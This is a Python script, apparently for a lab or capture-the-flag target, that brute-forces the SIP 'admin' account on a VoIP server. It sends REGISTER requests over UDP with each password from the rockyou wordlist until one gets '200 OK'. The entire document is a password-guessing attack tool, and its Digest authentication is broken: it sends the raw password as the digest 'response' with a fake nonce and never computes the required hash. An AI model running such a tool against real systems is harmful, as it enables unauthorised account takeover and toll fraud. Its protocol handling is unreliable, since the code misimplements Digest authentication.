import socket
import time

target_ip = "10.10.158.68"
target_port = 5060
username = "admin"
wordlist = "/usr/share/wordlists/rockyou.txt"

def build_sip_register(username, password, ip):
    return f"""REGISTER sip:{ip} SIP/2.0
Via: SIP/2.0/UDP attacker.local;branch=z9hG4bK-branch
Max-Forwards: 70
To: <sip:{username}@{ip}>
From: <sip:{username}@{ip}>;tag=1234
Call-ID: {int(time.time())}@attacker.local
CSeq: 1 REGISTER
Contact: <sip:{username}@attacker.local>
Authorization: Digest username="{username}", realm="{ip}", nonce="fake", uri="sip:{ip}", response="{password}"
Content-Length: 0

""".replace("\n", "\r\n").encode()

def send_sip_request(sock, data):
    sock.sendto(data, (target_ip, target_port))
    try:
        response, _ = sock.recvfrom(2048)
        return response.decode(errors="ignore")
    except socket.timeout:
        return ""

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    with open(wordlist, "r", encoding="latin-1") as f:
        for line in f:
            password = line.strip()
            sip_packet = build_sip_register(username, password, target_ip)
            print(f"[+] Trying password: {password}")
            response = send_sip_request(sock, sip_packet)
            if "200 OK" in response:
                print(f"\n✅ Valid password found: {password}")
                break
            elif "403" in response:
                print("[-] Forbidden")
            elif "401" in response:
                print("[-] Unauthorized")
            elif not response:
                print("[!] No response (timeout?)")
    sock.close()

if __name__ == "__main__":
    main()

